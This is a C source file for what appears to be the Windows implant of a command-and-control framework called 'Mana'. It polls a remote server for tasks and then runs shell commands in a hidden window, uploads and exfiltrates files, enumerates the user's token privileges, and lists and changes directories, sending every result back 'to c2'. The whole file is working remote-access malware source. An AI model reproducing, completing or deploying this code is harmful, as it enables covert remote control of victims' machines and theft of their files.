#include <Mana.h>

#include <Command.h>
#include <Package.h>
#include <Core.h>

#define Mana_COMMAND_LENGTH 9

Mana_COMMAND Commands[ Mana_COMMAND_LENGTH ] = {
        { .ID = COMMAND_SHELL,            .Function = CommandShell },
        { .ID = COMMAND_DOWNLOAD,         .Function = CommandDownload },
        { .ID = COMMAND_UPLOAD,           .Function = CommandUpload },
        { .ID = COMMAND_EXIT,             .Function = CommandExit },
        { .ID = COMMAND_WHOAMI,           .Function = CommandWhoami },
        { .ID = COMMAND_PWD,              .Function = CommandPwd },
        { .ID = COMMAND_CD,               .Function = CommandCd },
        { .ID = COMMAND_LS,               .Function = CommandLs },
};

VOID CommandDispatcher()
{
    PPACKAGE Package     = NULL;
    PARSER   Parser      = { 0 };
    PVOID    DataBuffer  = NULL;
    SIZE_T   DataSize    = 0;
    DWORD    TaskCommand = 0;

    puts( "Command Dispatcher..." );

    do
    {
        if ( ! Instance.Session.Connected ) {
            puts("Instance Session not connected");
            return;
        }

        Sleep( Instance.Config.Sleeping );

        Package = PackageCreate( COMMAND_GET_JOB );

        PackageAddInt32( Package, Instance.Session.AgentID );
        PackageTransmit( Package, &DataBuffer, &DataSize );

        if ( DataBuffer && DataSize > 0 )
        {
            PRINT_HEX( DataBuffer, DataSize )

            ParserNew( &Parser, DataBuffer, DataSize );
            do
            {
                TaskCommand = ParserGetInt32( &Parser );

                if ( TaskCommand != COMMAND_NO_JOB )
                {
                    printf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );

                    BOOL FoundCommand = FALSE;
                    for ( UINT32 FunctionCounter = 0; FunctionCounter < Mana_COMMAND_LENGTH; FunctionCounter++ )
                    {
                        if ( Commands[ FunctionCounter ].ID == TaskCommand )
                        {
                            Commands[ FunctionCounter ].Function( &Parser );
                            FoundCommand = TRUE;
                            break;
                        }
                    }

                    if ( ! FoundCommand )
                        puts( "Command not found !!" );

                } else puts( "Is COMMAND_NO_JOB" );

            } while ( Parser.Length > 4 );

            memset( DataBuffer, 0, DataSize );
            LocalFree( *( PVOID* ) DataBuffer );
            DataBuffer = NULL;

            ParserDestroy( &Parser );

        }
        else
        {
            puts( "Transport: Failed" );
            break;
        }

    } while ( TRUE );

    Instance.Session.Connected = FALSE;
}

VOID CommandLs( PPARSER Parser )
{
    puts( "Command::Ls" );

    PPACKAGE          Package         = PackageCreate( COMMAND_OUTPUT );
    CHAR              Output[16384]   = { 0 };
    INT               Offset          = 0;
    WIN32_FIND_DATAA  FindData        = { 0 };
    HANDLE            hFind           = INVALID_HANDLE_VALUE;
    CHAR              TargetDir[MAX_PATH] = { 0 };
    CHAR              FullPath[MAX_PATH] = { 0 };
    CHAR              SearchPath[MAX_PATH] = { 0 };
    SYSTEMTIME        SysTime         = { 0 };
    FILETIME          LocalTime       = { 0 };
    DWORD             FileCount       = 0;
    DWORD             DirCount        = 0;
    ULONGLONG         TotalSize       = 0;
    UINT32   ArgsLen        = 0;
    PCHAR    Args           = NULL;
    

    // Get arguments from parser
    Args = ParserGetBytes( Parser, &ArgsLen );

    // checks if args is provided by the operator if not it will use the current directory
    if ( ArgsLen > 0 && Args != NULL )
    {
        // Copy path from args
        memcpy( TargetDir, Args, (ArgsLen < MAX_PATH - 1) ? ArgsLen : MAX_PATH - 1 );

        // Trim trailing whitespace/newlines
        for ( INT i = strlen(TargetDir) - 1; i >= 0 && (TargetDir[i] == ' ' || TargetDir[i] == '\r' || TargetDir[i] == '\n'); i-- )
        {
            TargetDir[i] = '\0';
        }

        // If empty after trim, use current directory
        if ( strlen(TargetDir) == 0 )
        {
            GetCurrentDirectoryA( MAX_PATH, TargetDir );
        }
    }
    else
    {
        // No args, use current directory
        GetCurrentDirectoryA( MAX_PATH, TargetDir );
    }


    // Get full path for display for output
    GetFullPathNameA( TargetDir, MAX_PATH, FullPath, NULL );
    
    sprintf( SearchPath, "%s\\*", FullPath );

    // Header for output
    Offset += sprintf( Output + Offset, "\r\n Directory of %s\r\n\r\n", FullPath );
    Offset += sprintf( Output + Offset, "%-12s  %-8s  %-12s  %s\r\n", "Date", "Time", "Size", "Name" );
    Offset += sprintf( Output + Offset, "------------  --------  ------------  ----------------------------------------\r\n" );

    // Find files
    hFind = FindFirstFileA( SearchPath, &FindData );
    
    if ( hFind == INVALID_HANDLE_VALUE )
    {
        Offset += sprintf( Output + Offset, "[!] Failed to list directory (Error: %d)\r\n", GetLastError() );
    }

    do
    {
        // Convert file time to local time
        FileTimeToLocalFileTime( &FindData.ftLastWriteTime, &LocalTime );
        FileTimeToSystemTime( &LocalTime, &SysTime );

        // Format date and time
        CHAR DateStr[16] = { 0 };
        CHAR TimeStr[16] = { 0 };
        sprintf( DateStr, "%02d/%02d/%04d", SysTime.wMonth, SysTime.wDay, SysTime.wYear );
        sprintf( TimeStr, "%02d:%02d %s",
            (SysTime.wHour % 12) ? (SysTime.wHour % 12) : 12,
            SysTime.wMinute,
            (SysTime.wHour >= 12) ? "PM" : "AM" );

        // Format size
        CHAR SizeStr[16] = { 0 };

        // check if the hfile contains an attribute of a folder if yes it will be appended with <DIR>
        if ( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
        {
            strcpy( SizeStr, "<DIR>" );
            DirCount++;
        }
        else
        {
            // if not a folder it will get the file size and convert it to B,KB,MB and GB
            ULONGLONG FileSize = ((ULONGLONG)FindData.nFileSizeHigh << 32) | FindData.nFileSizeLow;
            TotalSize += FileSize;
            FileCount++;

            if ( FileSize >= 1073741824ULL )
                sprintf( SizeStr, "%.1f GB", (double)FileSize / 1073741824.0 );
            else if ( FileSize >= 1048576ULL )
                sprintf( SizeStr, "%.1f MB", (double)FileSize / 1048576.0 );
            else if ( FileSize >= 1024ULL )
                sprintf( SizeStr, "%.1f KB", (double)FileSize / 1024.0 );
            else
                sprintf( SizeStr, "%llu B", FileSize );
        }

        // Markers for hidden/system
        CHAR Marker[8] = { 0 };
        if ( FindData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN ) strcat( Marker, "[H]" );
        if ( FindData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM ) strcat( Marker, "[S]" );

        // Output line
        Offset += sprintf( Output + Offset, "%s  %s  %-12s  %s %s\r\n", DateStr, TimeStr, SizeStr, FindData.cFileName, Marker );


    } while ( FindNextFileA( hFind, &FindData ) );

    FindClose( hFind );

    // Shows the total file count with combined size, then directory count on the target directory
    Offset += sprintf( Output + Offset, "\r\n     %d File(s)  ", FileCount );
    if ( TotalSize >= 1073741824ULL )
        Offset += sprintf( Output + Offset, "%.2f GB\r\n", (double)TotalSize / 1073741824.0 );
    else if ( TotalSize >= 1048576ULL )
        Offset += sprintf( Output + Offset, "%.2f MB\r\n", (double)TotalSize / 1048576.0 );
    else
        Offset += sprintf( Output + Offset, "%llu bytes\r\n", TotalSize );
    Offset += sprintf( Output + Offset, "     %d Dir(s)\r\n", DirCount );

//transfer the data back to c2
PackageAddBytes( Package, (PBYTE)Output, Offset );
PackageTransmit( Package, NULL, NULL );
}

VOID CommandCd( PPARSER Parser )
{
    puts( "Command::Cd" );

    PPACKAGE Package        = PackageCreate( COMMAND_OUTPUT );
    CHAR     Output[1024]   = { 0 };
    INT      Offset         = 0;
    UINT32   ArgsLen        = 0;
    PCHAR    Args           = NULL;
    CHAR     Path[MAX_PATH] = { 0 };
    CHAR     CurrentDir[MAX_PATH] = { 0 };

    // Get arguments
    Args = ParserGetBytes( Parser, &ArgsLen );

    //copy path from args
    memcpy( Path, Args, (ArgsLen < MAX_PATH) ? ArgsLen : MAX_PATH - 1 );

    // Trim trailing whitespace/newlines for cd ..
    for ( INT i = strlen(Path) - 1; i >= 0 && (Path[i] == ' ' || Path[i] == '\r' || Path[i] == '\n'); i-- )
    {
        Path[i] = '\0';
    }

    // Attempt to change directory
    if ( SetCurrentDirectoryA( Path ) )
    {
        // Get and display new current directory
        if ( GetCurrentDirectoryA( MAX_PATH, CurrentDir ) )
        {
            Offset += sprintf( Output + Offset, "[+] Changed to: %s\r\n", CurrentDir );
        }
        else
        {
            Offset += sprintf( Output + Offset, "[+] Directory changed\r\n" );
        }
    }
    else
    {
        DWORD Error = GetLastError();
        
        if ( Error == ERROR_FILE_NOT_FOUND || Error == ERROR_PATH_NOT_FOUND )
        {
            Offset += sprintf( Output + Offset, "[!] Path not found: %s\r\n", Path );
        }
        else if ( Error == ERROR_ACCESS_DENIED )
        {
            Offset += sprintf( Output + Offset, "[!] Access denied: %s\r\n", Path );
        }
        else if ( Error == ERROR_INVALID_NAME )
        {
            Offset += sprintf( Output + Offset, "[!] Invalid path: %s\r\n", Path );
        }
        else
        {
            Offset += sprintf( Output + Offset, "[!] Failed to change directory (Error: %d)\r\n", Error );
        }
    }


PackageAddBytes( Package, (PBYTE)Output, Offset );
PackageTransmit( Package, NULL, NULL );
}

VOID CommandPwd( PPARSER Parser )
{
    puts( "Command::Pwd" );

    PPACKAGE Package         = PackageCreate( COMMAND_OUTPUT );
    CHAR     Output[512]     = { 0 };
    INT      Offset          = 0;
    CHAR     CurrentDir[MAX_PATH] = { 0 };

    if ( GetCurrentDirectoryA( MAX_PATH, CurrentDir ) )
    {
        Offset += sprintf( Output + Offset, "%s\r\n", CurrentDir );
    }
    else
    {
        Offset += sprintf( Output + Offset, "[!] Failed to get current directory\r\n" );
    }

    PackageAddBytes( Package, (PBYTE)Output, Offset );
    PackageTransmit( Package, NULL, NULL );
}

//Situational Awareness

VOID CommandWhoami( PPARSER Parser ){

    PPACKAGE Package  = PackageCreate( COMMAND_OUTPUT );
    char username[256];
    DWORD username_len = sizeof(username);
    HANDLE token = NULL;
    DWORD size = 0;
    PTOKEN_PRIVILEGES privileges = NULL;

    CHAR     Output[4096]    = { 0 };
    INT      Offset          = 0;


    // get current user
    if (GetUserNameA(username, &username_len)) {
        Offset += sprintf( Output + Offset, "[+] Current User: %s\r\n\r\n", username );
    }
    else {
        Offset += sprintf( Output + Offset, "[!] Failed to get username\r\n" );
    } 

    // get privilege information
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
        return;

    GetTokenInformation(token, TokenPrivileges, NULL, 0, &size);
    privileges = (PTOKEN_PRIVILEGES)malloc(size);

    if (!GetTokenInformation(token, TokenPrivileges, privileges, size, &size)) {
        CloseHandle(token);
        free(privileges);
        return;
    }

    // get current privileges
    // Header
    Offset += sprintf( Output + Offset, "%-35s | %-45s | %s\r\n", "Privilege Name", "Description", "Status" );
    Offset += sprintf( Output + Offset, "----------------------------------------------------------------------------------------------------\r\n" );

    for (DWORD i = 0; i < privileges->PrivilegeCount; i++) {
        char privName[128] = { 0 };
        DWORD privNameLen = sizeof(privName);
   

        if (!LookupPrivilegeNameA(NULL, &privileges->Privileges[i].Luid, privName, &privNameLen))
            continue;

        BOOL enabled = (privileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED);

        CHAR displayName[256];
        DWORD displayNameSize = sizeof(displayName);
        DWORD languageId = 0;

        BOOL result = LookupPrivilegeDisplayNameA(
            NULL,
            privName,
            displayName,
            &displayNameSize,
            &languageId   
        );
        Offset += sprintf( Output + Offset, "%-35s | %-40s | %s\r\n",
            privName,
            displayName,
            enabled ? "[+] Enabled" : "[-] Disabled"
        );

    }

    Offset += sprintf( Output + Offset, "\r\n[*] Total privileges: %lu\r\n", privileges->PrivilegeCount );

    free(privileges);
    CloseHandle(token);

    PackageAddBytes( Package, (PBYTE)Output, Offset );
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandShell( PPARSER Parser )
{
    puts( "Command::Shell" );

    DWORD   Length           = 0;
    PCHAR   Command          = NULL;
    HANDLE  hStdInPipeRead   = NULL;
    HANDLE  hStdInPipeWrite  = NULL;
    HANDLE  hStdOutPipeRead  = NULL;
    HANDLE  hStdOutPipeWrite = NULL;

    PROCESS_INFORMATION ProcessInfo     = { };
    SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
    STARTUPINFOA        StartUpInfoA    = { };

    Command = ParserGetBytes( Parser, (PUINT32) &Length );

    if ( CreatePipe( &hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0 ) == FALSE )
    {
        return;
    }

    if ( CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE )
    {
        return;
    }

    StartUpInfoA.cb         = sizeof( STARTUPINFOA );
    StartUpInfoA.dwFlags    = STARTF_USESTDHANDLES;
    StartUpInfoA.hStdError  = hStdOutPipeWrite;
    StartUpInfoA.hStdOutput = hStdOutPipeWrite;
    StartUpInfoA.hStdInput  = hStdInPipeRead;

    if ( CreateProcessA( NULL, Command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo ) == FALSE )
    {
        return;
    }

    CloseHandle( hStdOutPipeWrite );
    CloseHandle( hStdInPipeRead );

    AnonPipeRead( hStdOutPipeRead );

    CloseHandle( hStdOutPipeRead );
    CloseHandle( hStdInPipeWrite );
}

VOID CommandUpload( PPARSER Parser )
{
    puts( "Command::Upload" );

    PPACKAGE Package  = PackageCreate( COMMAND_UPLOAD );
    UINT32   FileSize = 0;
    UINT32   NameSize = 0;
    DWORD    Written  = 0;
    PCHAR    FileName = ParserGetBytes( Parser, &NameSize );
    PVOID    Content  = ParserGetBytes( Parser, &FileSize );
    HANDLE   hFile    = NULL;

    FileName[ NameSize ] = 0;

    printf( "FileName => %s (FileSize: %d)", FileName, FileSize );

    hFile = CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );

    if ( hFile == INVALID_HANDLE_VALUE )
    {
        printf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
        goto Cleanup;
    }

    if ( ! WriteFile( hFile, Content, FileSize, &Written, NULL ) )
    {
        printf( "[*] WriteFile: Failed[%ld]\n", GetLastError() );
        goto Cleanup;
    }

    PackageAddInt32( Package, FileSize );
    PackageAddBytes( Package, FileName, NameSize );

    PackageTransmit( Package, NULL, NULL );

Cleanup:
    CloseHandle( hFile );
    hFile = NULL;
}

VOID CommandDownload( PPARSER Parser )
{
    puts( "Command::Download" );

    PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
    DWORD    FileSize = 0;
    DWORD    Read     = 0;
    DWORD    NameSize = 0;
    PCHAR    FileName = ParserGetBytes( Parser, (PUINT32) &NameSize );
    HANDLE   hFile    = NULL;
    PVOID    Content  = NULL;

    FileName[ NameSize ] = 0;

    printf( "FileName => %s", FileName );

    hFile = CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
    if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
    {
        printf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
        goto CleanupDownload;
    }

    FileSize = GetFileSize( hFile, 0 );
    Content  = LocalAlloc( LPTR, FileSize );

    if ( ! ReadFile( hFile, Content, FileSize, &Read, NULL ) )
    {
        printf( "[*] ReadFile: Failed[%ld]\n", GetLastError() );
        goto CleanupDownload;
    }

    PackageAddBytes( Package, FileName, NameSize );
    PackageAddBytes( Package, Content,  FileSize );

    PackageTransmit( Package, NULL, NULL );

CleanupDownload:
    if ( hFile )
    {
        CloseHandle( hFile );
        hFile = NULL;
    }

    if ( Content )
    {
        memset( Content, 0, FileSize );
        LocalFree( Content );
        Content = NULL;
    }

}

VOID CommandExit( PPARSER Parser )
{

    PPACKAGE Package  = PackageCreate( COMMAND_EXIT );
    
    PackageTransmit( Package, NULL, NULL );

    ExitProcess( 0 );
}
